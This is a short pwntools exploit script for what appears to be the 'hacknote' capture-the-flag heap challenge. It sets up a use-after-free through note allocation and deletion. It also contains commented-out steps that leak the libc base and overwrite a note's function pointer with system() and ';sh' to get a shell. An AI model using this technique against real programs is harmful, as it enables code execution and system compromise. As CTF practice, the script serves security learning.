from pwn import *

hk = process('./hacknote')
libc = ELF('./libc_32.so.6')
 
def goto(n):
    hk.sendlineafter('Your choice :', str(n))
    return
 
def add_note(content, size):
    goto(1)
    hk.sendlineafter('Note size :', str(size))
    hk.sendlineafter('Content :', str(content))
    return
 
def delete_note(idx):
    goto(2)
    hk.sendlineafter('Index :', str(idx))
    return
 
def print_note(idx):
    goto(3)
    hk.sendlineafter('Index :', str(idx))
    c = hk.recvuntil('----------------------', drop=True)
    return c
 
def exploit():
    system_offset = libc.symbols['system']
    context.terminal = ['tmux', 'new-window']
    #gdb.attach(hk)
    add_note("B"*0x80, 0x80)
    add_note("C"*8, 8)
    delete_note(0)
    add_note("", 0)
    #leak = print_note(2)[:4]
    #print(hex(u32(leak)))
    #base = u32(leak) - 0x1ad4d0
    #print("Base libc : {}".format(hex(base)))
    #system = base + system_offset
    #sh = u32(";sh\0")
    #payload = p32(system) + ";sh\x00"
    #print("system : {}".format(hex(system)))
    #delete_note(1)
    #delete_note(1)
    #add_note("D"*0x80, 0x80)
    #add_note(payload, 8)
    #goto(3)
    #hk.sendlineafter('Index :', "3")
    hk.interactive()
 
def main():
    exploit()
 
if __name__ == '__main__':
    main()
